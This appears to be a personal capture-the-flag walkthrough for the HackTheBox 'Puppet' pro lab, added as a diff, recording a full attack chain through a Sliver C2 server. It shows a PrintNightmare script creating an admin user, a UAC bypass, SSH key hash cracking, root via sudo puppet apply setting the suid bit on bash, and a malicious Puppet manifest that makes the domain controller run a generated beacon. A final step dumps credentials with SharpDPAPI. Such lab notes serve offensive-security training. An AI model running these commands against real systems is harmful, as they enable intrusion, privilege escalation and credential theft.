@@ -1,0 +1,157 @@
+Puppet | HTB prolab (4 flag)
+=============================
+
+Reference 
+============
+
+https://razzlemouse.medium.com/puppet-pro-lab-writeup-509ec2acedb2
+
+https://panosoikogr.github.io/2025/11/04/VL-Puppet/
+
+https://medium.com/@Xotourliff/puppet-walkthrough-9da4cd1fbaf5
+
+https://vuln.dev/vulnlab-puppet/
+
+
+
+
+
+entry ip : 10.13.38.33
+
+Machines
+PUPPET-PM01    Linux      172.16.40.200
+PUPPET-DC01    Windows    172.16.40.5
+PUPPET-FILE01  Windows    172.16.40.50
+
+
+    21/tcp — vsftpd 3.0.5 (anonymous FTP enabled)
+    22/tcp — OpenSSH
+    8443/tcp — Sliver C2 server (HTTPS)
+    31337/tcp — Elite (C2 port)
+
+
+
+sudo socat TCP-LISTEN:31337,reuseaddr,fork TCP:10.13.38.33:31337
+
+
+execute -o -- cmd.exe /c type "C:\Users\Bruce.Smith\Desktop\flag.txt"    /Users/Bruce.Smith/
+1st flag : PUPPET{1c1740d66f7071xxxxxxxxxxxxxxxxxxxxxxxxx7d36}
+
+
+
+upload ~/Desktop/HTB Puppet Prolab/CVE-2021-1675.ps1 "C:\Windows\System32\CVE-2021-1675.ps1"
+
+execute -o -- powershell.exe -ExecutionPolicy Bypass -NoProfile -Command ". C:\tmp\CVE-2021-1675.ps1; Invoke-Nightmare -NewUser adm1n -NewPassword P@ssw0rd"
+
+runas -u adm1n -P "P@ssw0rd" -p "C:\ProgramData\Puppet\puppet-update.exe"
+
+
+upload /home/kali/Desktop/PuppetLab/extension/SspiUacBypass/bin/standalone/SspiUacBypass.exe "c:\temp\SspiUacBypass.exe"
+
+
+
+execute -o -- "C:\temp\SspiUacBypass.exe" "C:\ProgramData\Puppet\puppet-update.exe"
+
+flag 2 : PUPPET{3b3072985c075xxxxxxxxxxx8842861ef5aac55}
+
+
+PUPPET\svc_puppet_win_t1 process migrate -p 1196
+
+
+sliver (SHORT-TERM_RETINA) > execute -o -- arp -a
+
+[*] Output:
+
+Interface: 172.16.40.50 --- 0x3
+  Internet Address      Physical Address      Type
+  172.16.40.5           a2-de-ad-f1-df-18     dynamic   
+  172.16.40.200         a2-de-ad-5d-39-de     dynamic   
+  172.16.40.255         ff-ff-ff-ff-ff-ff     static    
+  224.0.0.22            01-00-5e-00-00-16     static    
+  224.0.0.251           01-00-5e-00-00-fb     static   
+
+
+┌──(kali㉿kali)-[~/Desktop/PuppetLab]
+└─$ cat ed25519.hash
+ed25519:$sshng$6$16$b15359c23be771859026d46fe38e9f2e$290$6f70656e7373682d6b65792d7631000000000a6165733235362d637472000000066263727970740000001800000010b15359c23be771859026d46fe38e9f2e0000001000000001000000330000000b7373682d656432353531390000002080d2e16eae380ad73bd4a4db4ce1ecbef00215495ed049944f355194eb58d4ef000000a009ba00b5d8c54262bf0103108e5c2fc7859b8506bc58e130062a5e7a661131337f2a3190bedf8aec05e82569487ff897069e6af9ac23869007ca8fe291771b64610f043a7ec86e60d9d23397be4bd8975b841e20bdd9da973cbcbd1294e9a6e771018bf404289c4bbfbb9cdcbf517d28e3134812cfa684e345c9a4c4ee7abbb6690e255d16851608b98e747fda4e3b500fcef2253f3aa82be799ac991c54d505$16$130
+                                                                                                                                                                                                                                            
+┌──(kali㉿kali)-[~/Desktop/PuppetLab]
+└─$ john ed25519.hash --wordlist=/usr/share/wordlists/rockyou.txt
+Using default input encoding: UTF-8
+Loaded 1 password hash (SSH, SSH private key [RSA/DSA/EC/OPENSSH 32/64])
+Cost 1 (KDF/cipher [0=MD5/AES 1=MD5/3DES 2=Bcrypt/AES]) is 2 for all loaded hashes
+Cost 2 (iteration count) is 16 for all loaded hashes
+Will run 2 OpenMP threads
+Press 'q' or Ctrl-C to abort, almost any other key for status
+puppet           (ed25519)     
+1g 0:00:07:27 DONE (2026-08-06 04:28) 0.002235g/s 18.35p/s 18.35c/s 18.35C/s total90..oscar123
+Use the "--show" option to display all of the cracked passwords reliably
+Session completed. 
+                                                                                                                                                                                                                                            
+┌──(kali㉿kali)-[~/Desktop/PuppetLab]
+└─$ john --show ed25519.hash
+ed25519:puppet
+
+1 password hash cracked, 0 left
+                                     
+
+
+
+portfwd add --bind 2222 -r 172.16.40.200:22
+
+
+dos2unix ed25519
+
+
+
+execute -o powershell.exe "Resolve-DnsName pm01; Resolve-DnsName dc01"
+
+
+ssh -i ed25519 -p 2222 "svc_puppet_lin_t1@puppet.vl"@127.0.0.1
+
+
+sudo puppet apply -e "exec { '/bin/sh -c \"chmod u+s /bin/bash\"': }"
+bash -p
+# id: uid=451001132(...) euid=0(root)
+
+find / -name "flag.txt" 2>/dev/null
+cat /root/flag.txt
+
+
+
+mkdir -p /etc/puppet/code/environments/production/manifests
+
+cat > /etc/puppet/code/environments/production/manifests/site.pp 
+node 'dc01.puppet.vl' {
+  exec { 'pwned':
+    command   => 'C:\\Windows\\System32\\cmd.exe /c \\\\file01.puppet.vl\\files\\update.exe',
+    logoutput => true,
+  }
+}
+node default {
+  notify { 'This is the default node': }
+}
+
+
+generate beacon --mtls 172.16.40.200:8443 --os windows --arch amd64 --save /tmp/update.exe
+
+
+use 18b16445  # svc_puppet_win_t1 session
+upload /tmp/update.exe \\\\file01.puppet.vl\\files\\update.exe
+
+
+
+upload /home/kali/tools/SharpCollection/NetFramework_4.7_x64/SharpDPAPI.exe c:\users\public\SharpDPAPI.exe
+
+execute -o -- "c:\users\public\SharpDPAPI.exe" machinetriage
+
+Folder: C:\Windows\System32\config\systemprofile\AppData\Local\Microsoft\Credentials
+
+
+
+
+
+
+
+
+
